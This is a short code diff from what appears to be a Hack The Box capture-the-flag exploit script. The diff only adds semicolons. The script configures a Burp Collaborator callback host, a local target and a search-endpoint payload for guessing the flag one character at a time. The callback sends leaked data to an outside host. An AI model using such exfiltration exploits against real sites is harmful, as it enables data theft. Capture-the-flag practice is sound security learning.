@@ -3,11 +3,11 @@
         var callback = "crossorigin.me/https://krfmt7icm3nfxbtwwmtt9ea42v8lwa.burpcollaborator.net";
         var target = "127.0.0.1:1337";
         
-        var abc = "-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_"
+        var abc = "-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_";
         var flag = "HTB";
         var specials = "%\”\’";
         
-        var payload = `http://${target}/api/entries/search?q=`
+        var payload = `http://${target}/api/entries/search?q=`;
 
         async function getPartialFlag(char) {
             return new Promise((resolve, reject)=> {
